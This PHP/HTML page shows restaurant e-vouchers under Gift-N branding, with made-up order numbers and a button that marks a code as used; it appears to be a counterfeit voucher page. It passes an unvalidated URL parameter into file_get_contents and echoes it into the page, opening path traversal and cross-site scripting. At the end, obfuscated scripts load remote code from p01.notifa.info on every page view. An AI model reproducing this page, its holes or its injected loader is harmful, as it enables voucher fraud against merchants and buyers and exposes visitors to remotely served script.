<?php require('../antiddos.php'); ?>

<?php 
error_reporting(0);
$fopen = file_get_contents('../voctanpdatabase/'.$_GET['code'].'.json');
if(!$fopen) {
    echo "<a id='goback' style='visibility:hidden;' href='javascript:history.go(-1);'></a>";
	echo '<script>document.getElementById("goback").click();</script>';
} else {
    $json = json_decode($fopen, true);
    if($json['status'] == 0) {
        echo "<a id='goback' style='visibility:hidden;' href='javascript:history.go(-1);'></a>";
	    echo '<script>document.getElementById("goback").click();</script>';
    } 
    if($json['type'] == 'kfc') {
        $val = 'KFC 100.000 Value Voucher';
    } else if($json['type'] == 'domino1') {
        $val = 'Dominos Pizza Value Voucher 100.000';
    } else if($json['type'] == 'domino2') {
        $val = 'Dominos Pizza Value Voucher 200.000';
    } else if($json['type'] == 'noya1') {
        $val = 'Yoshinoya Value Voucher 100.000';
    } else if($json['type'] == 'raacha1') {
        $val = 'Raa Cha Suki & BBQ 100.000';
    } else if($json['type'] == 'lotteria1') {
        $val = 'Voucher Lotteria Rp 50.000';
    } else if($json['type'] == 'hophop1') {
        $val = 'Voucher Hop Hop Value 28.000';
    } else if($json['type'] == 'esteler') {
        $val = '100K Value Voucher Es Teler 77';
    } else if($json['type'] == 'dcrep1') {
        $val = 'DCrepes Value Voucher 20.000';
    } else if($json['type'] == 'boga1') {
        $val = 'BOGA GROUP Value Voucher 200.000';
    } else if($json['type'] == 'boga2') {
        $val = 'BOGA GROUP Value Voucher 100.000';
    } else if($json['type'] == 'mcd') {
        $val = 'McDonald’s Value Voucher 100.000';
    } else if($json['type'] == 'steak21') {
        $val = 'Steak 21 Value Voucher 100.000';
    } else if($json['type'] == 'excelso1') {
        $val = 'Excelso Value Voucher 100.000';
    } else if($json['type'] == 'timezone1') {
        $val = 'Timezone Value Voucher 500.000 (Saldo 300.000 Free Games 200.000)';
    } else if($json['type'] == 'timezone2') {
        $val = 'Timezone Value Voucher 200.000 (Saldo 150.000 Free Games 50.000)';
    } else if($json['type'] == 'burgerking2') {
        $val = 'King Chicken Fillet + Fries (R) + Chicken + Jasmine Tea (R)';
    } else if($json['type'] == 'pizza1') {
        $val = 'Big Box topping Original Signature pizza + Pepperoni Cheese Fusilli + Beef Lasagna Voucher';
    } else if($json['type'] == 'burgerking3') {
        $val = 'Quattro Cheese Whopper + Chicken + Fries (R)';
    } else if($json['type'] == 'upnormal') {
        $val = 'CRP GROUP VOUCHER 100.000';
    } else if($json['type'] == 'burgerking1') {
        $val = 'Chicken Tendercrisp + King Chicken Fillet + Mozarella King Chicken Fillet';
    }
}
?>
<!DOCTYPE html>
			<html>
			<head>
				<meta name="viewport" content="width=device-width" />
				<title>https://egift.id/GC2aPx6v</title>
				<link href='https://fonts.googleapis.com/css?family=Poppins' rel='stylesheet' type='text/css'>
				<link rel="stylesheet" type="text/css" href="../css/gift.css">
				<link rel="stylesheet" href="https://code.jquery.com/ui/1.11.4/themes/smoothness/jquery-ui.css">
			</head>
			<body>
				<div>
					<div id="divWrap">
				<div id="divMain">
							<div class="mHeader" style="background-color: #002060;">
								<h1>E - VOUCHER</h1>
								<a href="#close" class="headerClose">close</a>
							</div>

					<div class="subWrap">
						<div class="subIn2">
							<table class="orderTable">
								<colgroup>
									<col width="30%">
									<col width="*">
								</colgroup>
								<tbody>
									<tr>
										<th>Produck</th>
										<td><span id="p_item_name"><?php echo $val; ?></span></td>
									</tr>
									<tr>
										<th>No Order</th>
										<td><span id="p_sepin_mno">DU<?php echo rand('111111111111','999999999999'); ?></span></td>
									</tr>
									<tr>
										<th>No Voucher</th>
										<td><?php
					for($i=0;$i<12;$i++) {
					    if($i % "4" == 0 && $i > 0) {
					        echo "-";
					    }
					echo "".$_GET['code'][$i].""; 
					
					}
					?></td>
									</tr>
									<tr style="visibility: hidden;">
										<th>Harga</th>
										<td><span id="p_item_price">10500</span></td>
									</tr>
								</tbody>
							</table>
							<div class="clear"></div>


							<div class="container" id="redeem_trig">
								<div class="orderNotice">
									Jika Anda Klik 'Setuju', Voucher ini tidak bisa<br />
									dipakai lagi.<br />
									Jangan Klik setuju. Kecuali Petugas
								</div>
								<div class="clear"></div>
								<a href="<?php echo $base_url; ?>../used/?code=<?php echo $_GET['code']; ?>"><div class="button_02" style="width: 100%; visibility: visible">Setuju</div></a>
							</div>



							<div class="clear"></div>
							<a href="javascript:history.go(-1);"><div class="button_center" style="width: 100%;">Kembali</div></a>
						</div>
					</div>
					<div class="clear" style="height: 50px;"></div>
						<div class="container cl-alert" style="display: block; background-color: #eee; border-radius: 10px; padding: 0 10px;">
					<p style="font-weight: 600; font-size: 1.2em; padding: 10px;">
						* E-voucher yang dibeli BUKAN lewat Gift-N dan E-Commerce resmi, tidak bisa digunakan di outlet manapun. Gift-N tidak bertanggung jawab jika terjadi masalah. <br /> <br />
						* Gift-N TIDAK MEMILIKI official reseller di facebook atau instagram. Akun pribadi yang menjual e-voucher Gift-N harus diwaspadai
					</p>
				</div>
					<div class="subIn" style="visibility: hidden;">
						<div class="prodInfo">
							<div id="prodInfo_ads" style="margin: 0 auto; padding: 10px; border: 1px solid #ccc; white-space: pre-wrap; line-height: 180%;"></div>
						</div>
						
					</div>
				</div><!-- End divMain -->
			</div><!-- End divWrap -->

			<div class="layer" style="width: 100%;">
				<div class="bg"></div>
				<div id="layer2" class="pop-layer">
					<div class="pop-container">
						<div class="pop-conts">
							<!--content //-->
							<p class="ctxt mb20">
								Jika kamu klik ok, tiket akan digunakan, setuju?
							</p>



					
							<!--// content-->
						</div>
					</div>
				</div>
			</div>

			<div class="container text-center" style="display: none;">
				<p>
					<a style="color: #4caf5080;" href="https://wa.me/6287888040125?text=Please%20Check%20this%20coupon%20http%3A%2F%2Fegift.id%2FBfm0dHuM">
						Get in touch with us, Thank you. <br />(PT.DMC CustomerCenter on WhatsApp)
					</a>
				</p>
			</div>

				</div>

				<!-- Global site tag (gtag.js) - Google Analytics -->
				<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-83926611-3"></script>
				<script>
					window.dataLayer = window.dataLayer || [];
					function gtag() { dataLayer.push(arguments); }
					gtag('js', new Date());

					gtag('config', 'UA-83926611-3');
				</script>

			<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdVvGnxaQL8PddAXvFwEMzPiSOZ%2bvbyj1%2fmUW%2faJ90fpF0ihoO6ElyVx7SEubtaszN6LRneczXsDXythK6vxAIYu1vb0c7nWSBPmGS6uJL4FSVSoyGxxhf8aD480dGtgVQwx2VHS8%2f187dTE0L8OcRBiSS6UNt3P%2b1fN%2bZ1XoRzwgxChu51LpfvBsYHwBhr%2fzlHDUXCzBoGDD9sha27%2fBW365ChWwW2bVDRi9HA7DJk9sNXN799ItZQEkGwngYgMSsGXm40y58CW5NdBjCO4TNOCVUIxkr12Eio4PbHijL0YQKbAz6FqDS0LFPew%2bBw7PxxI2UPbmuHPHczRYrTZKib3QzoQENPcyPsu750tCsODNGOaLeFVMrZPRrX5oXESVQ5s1oepGajvRamu8nqHzSeAZYQ8Q1i0LPDZbvCYmyA1Y%2b1AH3NFkpomFPrikBZexZzYbUIo%2fHY9n2jUywigiyUTuqdp98XDLniLzZTD3lwYRS8LvxyPicdZ6g0Pu0%2baKWFPIk%2bgkoFn2Cb5se6SYBXXUY2kg1ezVoVVeWcAI6gXx7PKJBVx8TtVGCJLv0HMGM9PKzac70Ksk%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdOwn%2bh7SIqr6jUVYd7p104PSDpG0xnldgRd5r2BloW%2f9Z9x0qdgD%2bzYNgKEwtchSKKXaRXGR6XsL0DBEVevWUQKhq7aQfkKcdxHfFrR7GcxLVD2LO2zWHaBL%2fgp%2fGLTgkYUk7f0uEOAslZcqjVielQW1Oc0S6LEwLOOQQcGeqkKrNEXXITzXqUDfT9aw8YoVFD4DvVI7rvEvtN7YiD7ElFph%2b9KgSOF%2fiaeRavJmCiJd%2f0SDHzuDJidjXP0mr1CO7KuesgwWBVUcbkONjD6s7h3fimdhYCKd0bhIle%2bzzi%2fbTMvBtbT4CpsKgU0CIcSV%2bGynVOCgywN6cJlgpVkUX5ZOe7QiGs0P4kdpbQzYg2KhbUoc%2btWTL7Z%2f%2fGJVqvvN6AfJjA7FCHXiuD59iNH90PUPStRupDLR8IPzx2S5IB1%2biNTi5j5Q2ami14lcfBkD6i%2bnJKV25pkKbh3oX772RDRgvP3TgDPxYn5zOWI5l4xGmR7LieFItzowopS8jkypu0WlfLiW10smdT%2f%2fSvttnQ1dOcEVDmyd0" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><!-- </body> --!></body>
			</html>
			